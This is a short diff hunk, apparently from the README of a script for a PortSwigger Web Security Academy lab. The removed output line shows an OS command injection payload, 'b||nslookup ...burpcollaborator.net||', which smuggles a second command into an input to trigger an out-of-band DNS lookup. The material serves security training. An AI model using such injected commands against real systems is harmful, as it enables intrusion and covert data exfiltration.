@@ -6,7 +6,6 @@ python3 comoast.py https://ac401feb1e4e7675c0909bba005f00c7.web-security-academy
 ```
 Output:
 ```
-b||nslookup 0gh58enmj0vxz279gzeagsoad1jr7g.burpcollaborator.net||
 Poll now!!
 ```
 
